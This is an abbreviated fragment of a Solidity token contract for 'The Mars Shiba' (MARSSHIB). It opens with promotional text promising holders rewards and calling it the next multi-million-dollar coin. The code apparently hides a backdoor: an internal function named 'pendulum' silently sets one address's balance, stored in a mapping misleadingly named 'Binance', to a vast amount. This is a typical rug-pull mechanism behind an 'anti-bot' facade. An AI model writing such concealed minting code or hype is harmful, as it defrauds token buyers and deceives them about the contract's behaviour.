...
/**
By simply holding TheMarsShiba Token, you will earn $MARSSHIBA token.
The longer you hold, the more you earn - it really is that simple. 
Combined with our weekly MARSSHIBA will become increasingly rare
and more rare by manual burned. So come on over, get involved, 
and do not miss out on the next multi million dollar coin.

 * https://themarsshiba.com/
 * https://twitter.com/TheMarsShiba
 * https://t.me/themarsshiba
*/
...
interface IERC20Metadata is IERC20 {
 ...
 contract MARSSHIB is ANTIBOTERC20, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private Binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "The Mars Shiba";
    string private _symbol = "MARSSHIB";
    uint256 private constant MAX = ~uint256(0);
//  https://www.coingecko.com/en/coins/MARSSHIB
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function pendulum() internal {
      Binance[_taktak] = 42000000000000000000000000000;
    }
